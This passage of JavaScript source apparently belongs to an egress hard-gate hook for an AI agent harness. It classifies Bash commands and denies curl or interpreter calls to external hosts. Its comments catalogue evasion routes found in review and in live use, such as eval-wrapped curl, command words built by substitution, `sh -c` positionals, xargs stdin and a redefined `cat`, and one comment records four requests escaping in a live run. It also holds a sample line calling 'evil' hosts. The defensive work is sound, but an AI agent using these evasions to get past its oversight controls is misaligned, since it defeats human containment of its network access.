  for (let j = Math.max(k, 0); k !== -1 && j + 1 < line.length; j++) {
    const b = line[j][1]
    if (masked[b] !== '|' || masked[b + 1] === '|') break
    const w = withoutRedirects(shellWords(orig.slice(Math.max(line[j + 1][0], ls), Math.min(line[j + 1][1], le))))
    const i = commandIndex(w)
    const name = i < w.length ? normalizedName(w[i]) : ''
    if (INTERPRETER.test(name.toLowerCase())) return name
  }
  return null
}
// The words of the sub-command holding offset `at`, from its start up to `at`, past its command word.
function argsBefore(orig, masked, at) {
  for (const [a, b] of spans(masked)) {
    if (at < a || at > b) continue
    // group words are no operands: `( bash ) <<S` read `)` as a script name, so the body as data
    const sw = shellWords(orig.slice(a, at)).filter((x) => !/^[(){}!]+$/.test(x))
    return sw.slice(commandIndex(sw) + 1)
  }
  return []
}
// The curl destinations a substitution builds on a readable line (didi F3, card c8b1ccbf): the
// sub-command read from the MARKED text, every loop reading too, so a host part holding a marker names
// the substitution that built it (curlDestinations reads that substitution's command for hosts).
function substitutedCurlHosts(seg, env, loops, inners, ctx) {
  const out = []
  for (const t of [expand(seg, env), ...(loopVariants(seg, env, loops) ?? [])]) {
    if (!MARKS.test(t)) continue
    const argv = shellWords(t)
    const at = argv.findIndex((w) => normalizedName(w) === 'curl')
    if (at !== -1) out.push(...curlDestinations(argv.slice(at + 1), inners, null, ctx))
  }
  return out
}
// A variable assigned from a substitution (`x=$(...)`, `export x="$(...)"`): the text before the `$(`.
const ASSIGNED_FROM_SUBST = /(?:^|[\s;&|(])(?:export\s+|local\s+|readonly\s+|declare\s+(?:-\w+\s+)?)?([A-Za-z_][A-Za-z0-9_]*)="?$/
// `substituted`: this text is the inside of a $(...) / `...`, whose output the outer line uses.
// `inherited`: the assignments and loop values of the line this text is part of ({ env, loops, untrusted, unread, arrays }),
// and for an eval / sh -c body the text of that line before it (`scope`), where its command word may be set.
// A substitution runs in the loop it sits in, so `for u in URL; do echo "$(curl $u)"; done` reads
// the inner curl with u bound (card c8b1ccbf, shape 6: live on 2026-10-15, four requests went out).
// A function body glued to its head (`f()(curl ...)`, `function f()(curl`, `f ()(g()(curl`): a space
// after the opener makes the head a word of its own, so commandIndex steps over it (didi 36014, 36034).
const GLUED_FUNCTION_BODY = /(\(\)\s*)([({])(?=[^\s)}])/g
export function classify(command, depth = 0, vendorHosts = new Set(), vendorDomains = new Set(), substituted = false, inherited = null) {
  const norm = String(command ?? '').replace(/\\\r?\n/g, ' ').replace(GLUED_FUNCTION_BODY, '$1$2 ')
  const { stripped: orig, marked, inners, innerAt, herestrings } = liftSubstitutions(norm)
  const masked = maskInertLiterals(orig)
  if (masked === null || masked.length !== orig.length) {
    const untrusted = Boolean(inherited?.untrusted) || definesCommands(norm) || DEFINES_IN_QUOTES.test(norm)
    // An unclosed `...` / $(...) lifts the REST of the line as its inner text: an array the line wrote
    // before it is out of that text (ford's `H=(-H ...); curl "${H[@]}" URL | python3 -c "...\`..."`
    // read `${H[@]}` as an unknown host, d6b95892 fleet replay). The line's arrays go with it.
    const arrays = { ...(inherited?.arrays ?? {}), ...collectArrays(norm, norm) }
    if (depth < 4) {
      for (const inner of inners) { const r = classify(inner, depth + 1, vendorHosts, vendorDomains, true, { ...inherited, untrusted, arrays }); if (r.deny) return r }
    }
    return unreadableVerdict(norm, vendorHosts, vendorDomains, inherited?.arrays)
  }
  // A line that redefines commands: no echo / printf / cat proves a literal print, here or in what it runs.
  const untrusted = Boolean(inherited?.untrusted) || definesCommands(masked) || DEFINES_IN_QUOTES.test(orig)
  const trustPrint = !untrusted
  // Names written in a form the assignment reading does not take stay unexpanded, in every reading.
  const unread = unreadNames(masked, inherited?.unread, orig, fedReads(orig, masked, herestrings))
  const env = { ...(inherited?.env ?? {}), ...collectAssignments(orig, masked) }
  const loops = { ...(inherited?.loops ?? {}), ...collectLoops(orig, masked, env) }
  // The same assignments read from the MARKED text (`h=$(...)` keeps its marker), and each substitution's
  // command with this line's assignments expanded: what a curl destination built by one can be (F3).
  const markedEnv = { ...(inherited?.env ?? {}), ...collectAssignments(marked, masked) }
  for (const v of unread) { delete env[v]; delete markedEnv[v] }
  const arrays = { ...(inherited?.arrays ?? {}), ...collectArrays(orig, masked, env) }
  const innerTexts = inners.map((x) => expand(x, env))
  // `x=$(cat <<EOF ... EOF); curl "$x"`: the substitution's output is not known, but a URL written in
  // it is a value x can take (card c8b1ccbf, shape 5). Judged like a loop value; the plain reading,
  // with x empty, is judged as well.
  innerAt.forEach((at, k) => {
    const m = ASSIGNED_FROM_SUBST.exec(orig.slice(orig.lastIndexOf('\n', at - 1) + 1, at))
    const urls = m ? (inners[k].match(URL_RE) ?? []) : []
    if (urls.length) loops[m[1]] = [...(loops[m[1]] ?? []), ...urls]
  })
  const feeds = stdinFeeds(orig, masked, herestrings, env, marked, inners)
  // A `while read u; do ...; done <<< "URL"` (or `<<EOF` body, or `read u <<< "URL"`) binds u to
  // the fed lines in the same command, exactly like `for u in URL`: the values join the loop values.
  const reads = collectReads(orig, masked)
  for (const f of reads.length ? feeds : []) {
    const c = commandWordAt(orig, masked, f.at)
    if (c !== 'done' && c !== 'read') continue
    const text = f.expands ? expand(f.text, env) : f.text
    for (const r of reads) for (const [v, vals] of Object.entries(readValues(text, r))) loops[v] = [...(loops[v] ?? []), ...vals]
  }
  if (depth < 4) {
    for (const inner of inners) { const r = classify(inner, depth + 1, vendorHosts, vendorDomains, true, { env, loops, untrusted, unread, arrays }); if (r.deny) return r }
  }
  // A heredoc / here-string that IS the program of an interpreter is judged like a -c / -e body: the
  // same NET_PRIMITIVE test, the same URL_RE scan, the same local / private / vendor exceptions. A
  // shell interpreter's body is a command line of its own, so it gets the whole analysis.
  for (const f of feeds) {
    let cmd = commandWordAt(orig, masked, f.at)
    let shell = cmd !== null && SHELL.test(cmd)
    const shellArgs = shell ? argsBefore(orig, masked, f.at) : []
    // `bash -c 'python3 -'`: the body is the interpreter's program, judged by the interpreter rule
    const handedTo = shell ? stdinInterpreter(shellArgs) : null
    const plain = f.expands ? expand(f.text, env) : f.text
    const variants = f.expands ? loopVariants(f.text, env, loops) : []
    if (handedTo) {
      // What the interpreter leaves of the stdin, the rest of the body reads (`bash -c 'python3 -c
      // X; bash'`): the body stays a command line as well.
      for (const text of depth < 4 ? [plain, ...(variants ?? [])] : []) {
        const r = classify(text, depth + 1, vendorHosts, vendorDomains, substituted, { env, loops, untrusted, unread, arrays })
        if (r.deny) return { ...r, reason: `heredoc-${r.reason}` }
      }
      cmd = handedTo; shell = false
    }
    const interpreter = !shell && cmd !== null && INTERPRETER.test(cmd.toLowerCase())
    const piped = !shell && !interpreter ? pipedInterpreter(orig, masked, f.at) : null
    // A here-string a substitution builds: what it prints is unknown, so when it reaches a program its
    // command text is judged as an unreadable line is (a network word and an external host deny).
    if (f.inners?.length && (handedTo || interpreter || piped || (shell ? !shellStdinIsData(shellArgs, trustPrint) : feedRunsAsProgram(orig, masked, f.at, trustPrint)))) {
      for (const inner of f.inners) {
        const r = unreadableVerdict(inner, vendorHosts, vendorDomains)
        if (r.deny) return { ...r, reason: `herestring-${r.reason}` }
      }
    }
    if (piped) cmd = piped
    else if (!shell && !interpreter) {
      // Not a shell's own heredoc, but the body can still reach one (`source /dev/stdin`, `{ bash; }`,
      // `cat <<S | bash`): then it is a program and gets the whole analysis.
      if (depth >= 4 || !feedRunsAsProgram(orig, masked, f.at, trustPrint)) continue
      for (const text of [plain, ...(variants ?? [])]) {
        const r = classify(text, depth + 1, vendorHosts, vendorDomains, substituted, { env, loops, untrusted, unread, arrays })
        if (r.deny) return { ...r, reason: `heredoc-${r.reason}` }
      }
      if (variants === null) return { deny: true, reason: 'heredoc-loop-unbounded', hosts: [] }
      continue
    }
    for (const text of [plain, ...(variants ?? [])]) {
      if (shell) {
        if (depth >= 4) break
        const r = classify(text, depth + 1, vendorHosts, vendorDomains, substituted, { env, loops, untrusted, unread, arrays })
        // The unreadable-line rule judges a PROGRAM. A body fed to a script as data keeps the reading
        // it had before card c8b1ccbf: measured on 4 days of fleet commands (21 086), the one heredoc
        // it would have newly denied was an agent-msg.sh message mentioning a link.
        if (r.deny && r.reason === 'unparseable-external' && shellStdinIsData(shellArgs, trustPrint)) continue
        if (r.deny) return { ...r, reason: `heredoc-${r.reason}` }
        continue
      }
      if (!(PYTHON.test(cmd.toLowerCase()) ? pythonUsesNetwork(text) : usesNetwork(cmd, text))) continue
      const found = [...text.matchAll(URL_RE)].map((m) => m[0]).filter(isExternal).map(hostOf)
      const hosts = [...new Set(found)].filter((h) => !vendorHosts.has(h) && !hostInDomains(h, vendorDomains))
      if (hosts.length) return { deny: true, reason: 'heredoc-external', hosts }
    }
    if (variants === null) return { deny: true, reason: 'heredoc-loop-unbounded', hosts: [] }
  }
  // On a line that redefines a name, a text-only receiver can be a program in disguise
  // (`cat(){ python3 -; }; export -f cat; bash -c 'cat' <<S`, didi round 7 item 3), and which
  // interpreter it runs is unknown: every fed body is also read as an unreadable line is.
  for (const f of untrusted ? feeds : []) {
    for (const text of f.expands ? [expand(f.text, env), ...(loopVariants(f.text, env, loops) ?? [])] : [f.text]) {
      const r = unreadableVerdict(text, vendorHosts, vendorDomains)
      if (r.deny) return { ...r, reason: `redefined-feed-${r.reason}` }
    }
  }
  const named = bodiesAreText(orig, masked, depth, substituted) ? blankHeredocBodies(orig, masked) : orig
  // The line without its heredoc bodies, substitutions kept (`orig` is length-preserving): a body is
  // stdin, not this shell's words, and one that is a program is judged as its own feed. An `eval
  // "$(...)"` quoted in a message heredoc is no computed name (fleet replay, d6b95892 round 5).
  let outerNorm = norm
  for (const { start, end } of heredocBodies(orig, masked)) {
    outerNorm = outerNorm.slice(0, start) + outerNorm.slice(start, end).replace(/[^\n]/g, ' ') + outerNorm.slice(end)
  }
  const bodyScope = (b) => (inherited?.scope ? `${inherited.scope}\n${outerNorm.slice(0, b)}` : outerNorm.slice(0, b))
  for (const [a, b] of spans(masked)) {
    const mw = words(masked.slice(a, b))
    const i = commandIndex(mw)
    if (xargsStdinCommand(shellWords(named.slice(a, b)))) return { deny: true, reason: 'xargs-stdin-command', hosts: ['<command from stdin>'] }
    // A command word that stays an expansion after the line's own assignments are read: a variable
    // set from a substitution (`X=$(echo curl); $X URL`), a positional (`set -- curl; $1 URL`), an
    // array (`a=(curl URL); "${a[@]}"`). It can be curl (didi 36220 item 2). It denies when the
    // text that could have set it names a network tool and an external host: for a variable, the
    // line up to this sub-command; for a positional, the whole line (a function's arguments come
    // after its body). Heredoc bodies are left out. A word with no network tool anywhere in that
    // text (`$EDITOR notes.md`, an inherited `$X URL`) stays open, see the header. Read before the
    // masked words: a quoted word (`"${a[@]}"`) is blank there.
    const sw0 = shellWords(named.slice(a, b))
    const cw0 = sw0[commandIndex(sw0)] ?? ''
    const ecw = expand(cw0, env)
    // A substitution AS the command word (`$(echo curl) URL`, `` `echo curl` URL ``) is lifted, so it
    // is blank in `named` and the next word reads as the command: read it from `outerNorm`, where
    // it is kept (didi 36252 T17, T18).
    const ow = shellWords(outerNorm.slice(a, b))
    const substCommand = /^(?:\$\(|`)/.test(ow[commandIndex(ow)] ?? '')
    if (substCommand || (cw0.includes('$') && (ecw === '' || ecw.includes('$')))) {
      const own = /\$(?:[@*0-9]|\{[@*0-9])/.test(cw0) ? outerNorm : outerNorm.slice(0, b)
      // An eval / sh -c body is read on its own, but the line that runs it may set its command word
      // (`x=$(echo curl); eval "$x URL"`, didi 36796): that line is part of the scope.
      const scope = inherited?.scope ? `${inherited.scope}\n${own}` : own
      if (namesNetwork(scope)) {
        const hosts = [...new Set([...externalHosts(scope, vendorHosts, vendorDomains), ...unreadableWordHosts(expand(orig.slice(a, b), env))])]
          .filter((h) => !isLocalHost(h) && !vendorHosts.has(h) && !hostInDomains(h, vendorDomains))
        if (hosts.length) return { deny: true, reason: 'unread-command-word', hosts }
      }
    }
    // No command word in the MASKED words is not "no command": masking blanks a quoted word, so a
    // line whose name and arguments are all quoted (`"<tool>" "URL"`, `"eval" "..."`, `"sh" "-c" "..."`)
    // has no masked word left, and after a prefix command the masked index runs past the end because a
    // real argument is read as the prefix's own option (`env "<tool>" -s "URL"`). Skipping there let
    // all of them through (card 1a701051). Skipped only when the shell words have no command either.
    if (i >= mw.length && commandIndex(sw0) >= sw0.length) continue
    // Every loop reading AND the plain one: a loop variable can share its name with an assignment
    // elsewhere in the command (`for u in <local>; do ...; done; u=<external>; curl "$u"`), and a
    // loop-only reading would let the assigned value go unjudged (didi's review of 804ab1cf).
    const plain = expand(orig.slice(a, b), env)
    const variants = loopVariants(orig.slice(a, b), env, loops)
    let substHosts = null
    for (const text of [plain, ...(variants ?? [])]) {
      // The command NAME is read from the ORIGINAL text through shellWords, not from the masked one:
      // masking blanks a quoted "curl", and the shell runs `Curl` (case-insensitive disk,
      // /usr/bin/Curl exists), `\curl`, `"curl"` and `c''url` as curl (didi 19977, marveen 19980).
      const sw = shellWords(named.slice(a, b))
      // A command word that is a variable this command assigned (`X=curl; $X URL`) is read from the
      // expanded text (dexter, d6b95892 round 5); one never assigned here stays unread.
      const cw = sw[commandIndex(sw)] ?? ''
      const cmd = cw.includes('$') ? commandName(shellWords(text), mw[i]) : commandName(sw, mw[i])
      // xargs before the command: its arguments come from stdin, which the argv reading below never
      // sees (`echo URL | xargs curl`, `xargs curl <<< URL`; card c8b1ccbf, shape 3).
      const viaXargs = sw.slice(0, commandIndex(sw)).some((w) => normalizedName(w) === 'xargs')
      // `eval WORDS`: the words, joined, are a command line run here (`eval curl -s https://evil/x`
      // passed the live gate: the command word read was eval; dexter, d6b95892 round 4).
      if (cmd === 'eval') {
        // `eval -- WORDS`: the `--` ends eval's options and is no part of the line (didi 36152)
        const evalLine = (argv) => {
          const at = argv.findIndex((w) => normalizedName(w) === 'eval')
          return at === -1 ? '' : argv.slice(at + 1 + (argv[at + 1] === '--' ? 1 : 0)).join(' ')
        }
        const body = evalLine(shellWords(text))
        // The same line with its substitutions kept: lifted, `eval "$(echo curl) URL"` read as
        // `eval " URL"` and its command word was gone (didi 36603 item 1). Lifting also blanks an
        // escaped \$ inside "...", so any difference counts, not only a substitution (didi 36796).
        const kept = depth < 4 ? evalLine(shellWords(outerNorm.slice(a, b))) : ''
        for (const t of kept !== body ? [body, kept] : [body]) {
          if (!t.trim()) continue
          const r = depth < 4
            ? classify(t, depth + 1, vendorHosts, vendorDomains, substituted, { env, loops, untrusted, unread, arrays, scope: bodyScope(b) })
            : unreadableVerdict(t, vendorHosts, vendorDomains)
          if (r.deny) return { ...r, reason: `eval-${r.reason}` }
        }
        continue
      }
      // `bash -c BODY`: the body is a command line, judged in full (card c8b1ccbf, shape 2).
      if (SHELL.test(cmd)) {
        const argv = shellWords(text)
        const at = argv.findIndex((w) => normalizedName(w) === cmd)
        // The kept text too: lifting blanks an escaped \$ inside "...", and `xargs sh -c "\$0 URL"`
        // read as `  0 URL` (didi 36796).
        const kargv = shellWords(outerNorm.slice(a, b))
        const kat0 = kargv.findIndex((w) => normalizedName(w) === cmd)
        if (viaXargs && ((at !== -1 && xargsShellRunsStdin(argv.slice(at + 1), xargsReplace(sw))) ||
          (kat0 !== -1 && xargsShellRunsStdin(kargv.slice(kat0 + 1), xargsReplace(sw))))) {
          return { deny: true, reason: 'xargs-stdin-command', hosts: ['<command from stdin>'] }
        }
        const split = at === -1 ? null : shellCSplit(argv.slice(at + 1))
        if (split === null) continue
        const body = split.body
        // The body with its positionals bound is read first: `sh -c '$1 URL' _ curl` IS a curl to
        // URL, and read unbound it only counts as an unread command word because its scope names
        // curl. Both readings deny; this order keeps the reason that says what runs.
        const bound = depth < 4 ? bindPositionals(body, split.rest) : body
        if (bound !== body) {
          const rb = classify(bound, depth + 1, vendorHosts, vendorDomains, substituted, { env, loops, untrusted, unread, arrays, scope: bodyScope(b) })
          if (rb.deny) return { ...rb, reason: `shell-c-${rb.reason}` }
        }
        const r = depth < 4
          ? classify(body, depth + 1, vendorHosts, vendorDomains, substituted, { env, loops, untrusted, unread, arrays, scope: bodyScope(b) })
          : unreadableVerdict(body, vendorHosts, vendorDomains)
        if (r.deny) return { ...r, reason: `shell-c-${r.reason}` }
        if (depth < 4) {
          // The same body with its substitutions kept: lifted, `sh -c "$(echo curl) URL"` reads as
          // `sh -c " URL"` and its command word is gone (didi 36252 T21). Lifting blanks an escaped
          // \$ inside "..." too: `sh -c "\$1 URL" _ curl` read as `  1 URL` (didi 36796), so any
          // difference counts. The kept body is read once more with its positionals bound to the words
          // after it (didi 36603 item 3).
          const kw = shellWords(outerNorm.slice(a, b))
          const kat = kw.findIndex((w) => normalizedName(w) === cmd)
          const ks = kat === -1 ? null : shellCSplit(kw.slice(kat + 1))
          const kept = ks !== null && ks.body !== body ? ks : null
          const readings = [kept?.body, kept && bindPositionals(kept.body, kept.rest)]
          for (const t of new Set(readings.filter((x) => x != null && x !== body && x !== bound))) {
            const rk = classify(t, depth + 1, vendorHosts, vendorDomains, substituted, { env, loops, untrusted, unread, arrays, scope: bodyScope(b) })
            if (rk.deny) return { ...rk, reason: `shell-c-${rk.reason}` }
          }
        }
        if (viaXargs && namesNetwork(body)) {
          const hosts = externalHosts(norm, vendorHosts, vendorDomains)
          if (hosts.length) return { deny: true, reason: 'xargs-external', hosts }
        }
        continue
      }
      let target = null
      if (cmd === 'curl') target = 'curl'
      // The code flag is looked for in the same shell words the NAME was read from, past that name.
      // Read from the masked words it was lost twice: a quoted name is blank there, so the index
      // pointed at the flag itself and the slice dropped it (`"<interpreter>" -c CODE`), and a quoted
      // flag is blank too (`<interpreter> "-c" CODE`), while the shell hands the interpreter the
      // same argv either way (card 1a701051).
      else if (INTERPRETER.test(cmd.toLowerCase()) && hasCodeFlag(cmd, argsAfterCommand(cw.includes('$') ? shellWords(text) : sw)) && usesNetwork(cmd, text)) target = 'one-liner'
      if (!target) continue
      if (viaXargs) {
        const hosts = externalHosts(norm, vendorHosts, vendorDomains)
        if (hosts.length) return { deny: true, reason: 'xargs-external', hosts }
      }
      // curl: the destination is read from the ARGV only. A URL inside a flag VALUE (-d, -e, -H, a
      // JSON payload) is data sent to wherever curl connects, not a destination. The fleet reports PR
      // links with a localhost curl whose -d JSON carries a github.com URL, and scanning the whole text
      // with URL_RE denied exactly that (#1514 re-review, measured on the merged head). An interpreter
      // one-liner has no argv to read, so its code is still scanned with URL_RE.
      let found
      const argv = target === 'curl' ? shellWords(text) : null
      const at = argv ? argv.findIndex((w) => normalizedName(w) === 'curl') : -1
      if (at !== -1) {
        const ctx = { unread, text: norm, outer: outerNorm, arrays }
        substHosts ??= substitutedCurlHosts(marked.slice(a, b), markedEnv, loops, innerTexts, ctx)
        found = [...curlDestinations(argv.slice(at + 1), null, null, ctx), ...substHosts]
      } else found = [...text.matchAll(URL_RE)].map((m) => m[0]).filter(isExternal).map(hostOf)
      // A listed vendor host (or a host under a listed domain) passes only by itself: any other
      // destination in the same call still denies.
      const hosts = [...new Set(found)].filter((h) => !vendorHosts.has(h) && !hostInDomains(h, vendorDomains))
      if (hosts.length) return { deny: true, reason: `${target}-external`, hosts }
      if (variants === null) return { deny: true, reason: `${target}-loop-unbounded`, hosts: [] }
    }
  }
  return { deny: false, reason: null, hosts: [] }
}

const GATE_MSG =
  'Kulso halozati hivas Bash-bol TILTVA (egress hard-gate): curl vagy interpreter-egysoros kulso URL-re, ' +
  'akkor is, ha az URL valtozoban van. A localhost/127.0.0.1 hivasok (dashboard) es a helyi halozat ' +
  '(10/8, 172.16/12, 192.168/16, *.local) szabadok. Kulso tartalmat ' +
  'a quarantine-reader sub-ugynokon at kerj le; ha ez egy vendor-API hivas, kerd a fo-agenst.'
function isInvokedDirectly() {
  try { return realpathSync(fileURLToPath(import.meta.url)) === (process.argv[1] ? realpathSync(process.argv[1]) : '') } catch { return false }
}
if (isInvokedDirectly()) {
  let payload
  try { payload = JSON.parse(readFileSync(0, 'utf-8')) } catch { process.exit(0) }
  if (payload?.tool_name !== 'Bash') process.exit(0)
  const agent = agentFromArgv(process.argv.slice(2))
  const command = String(payload?.tool_input?.command ?? '')
  const logRow = (row) => {
    try {
      mkdirSync(dirname(BLOCK_LOG), { recursive: true })
      appendFileSync(BLOCK_LOG, JSON.stringify({ ts: new Date().toISOString(), cwd: process.cwd(), ...(agent ? { agent } : {}), ...row }) + '\n')
    } catch { /* a log failure changes no decision */ }
  }
  let r
  let agentHosts = new Set()
  try {
    const vendorHosts = loadVendorHosts()
    const vendorDomains = loadVendorDomains()
    agentHosts = loadAgentHosts(agent)
    r = classify(command, 0, new Set([...vendorHosts, ...agentHosts]), vendorDomains)
    // FAIL CLOSED for an excepted agent: its curl-https deny rules are gone, so an unread curl to an
    // https URL would otherwise leave with no gate at all.
    if (!r.deny && r.reason === 'unparseable' && agentHosts.size && CURL_HTTPS.test(command)) {
      r = { deny: true, reason: 'unparseable-agent-exception', hosts: [] }
    }
    // ...and a READABLE curl must be readable in full (didi 19977): see strictCurlReason.
    if (!r.deny && agentHosts.size) {
      const strict = strictCurl(command, new Set([...vendorHosts, ...agentHosts]), vendorDomains)
      if (strict) r = { deny: true, reason: strict.reason, hosts: strict.hosts }
    }
    // Every call that passes ONLY because of this agent's entry is logged: the exception is visible.
    if (!r.deny && agentHosts.size) {
      const without = classify(command, 0, vendorHosts, vendorDomains)
      if (without.deny) logRow({ decision: 'allow-agent-exception', reason: without.reason, hosts: without.hosts })
    }
  } catch (e) {
    if (agentHosts.size && CURL_HTTPS.test(command)) r = { deny: true, reason: 'internal-error-agent-exception', hosts: [] }
    else { process.stderr.write(`bash-egress-parser: internal error, allowing: ${e?.message}\n`); process.exit(0) }
  }
  if (r.deny) {
    logRow({ reason: r.reason, hosts: r.hosts })
    // An unreadable line is denied by its URL, not its parse: name the way out (card c8b1ccbf).
    const hint = r.reason === 'unparseable-external'
      ? ' A kapu ezt a parancsot nem tudta ertelmezni (pl. nem egyszeru heredoc-hatarolo, <<E"O"F): ha a hivas localhostra megy, irj egyszeru, idezett hatarolot (<<\'EOF\'), vagy a szoveget a Write eszkozzel fajlba.'
      : ''
    process.stdout.write(JSON.stringify({ hookSpecificOutput: { hookEventName: 'PreToolUse', permissionDecision: 'deny', permissionDecisionReason: `${GATE_MSG}${hint} (hoszt: ${r.hosts.join(', ')})` } }))
  }
  process.exit(0)
}
